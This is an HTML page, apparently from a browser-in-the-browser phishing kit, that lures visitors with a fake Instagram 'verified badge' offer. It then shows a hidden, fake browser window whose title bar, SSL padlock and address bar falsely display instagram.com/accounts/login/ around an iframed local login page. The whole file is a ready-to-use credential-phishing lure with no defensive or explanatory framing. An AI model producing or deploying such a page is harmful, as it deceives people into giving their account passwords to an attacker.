<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="ad-wrapper" style="text-align: center; border: 1px solid #dbdbdb; padding: 30px; width: 350px; margin: 40px auto; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; border-radius: 8px;">
    <img src="./logo.svg" width="60" style="margin-bottom: 15px;">
    <h3 style="margin: 0 0 10px 0; color: #262626;">Exclusive Offer</h3>
    <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Your account is eligible for a verified badge. Claim yours now!</p>
    
    <button id="clickme" style="background-color: #0095f6; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 600; width: 100%;">Learn More</button>
</div>
<div id="window" style="display: none;">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./logo.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">Login • Instagram</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">instagram.com</span>
		<span id="domain-path">/accounts/login/</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="login.html" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>
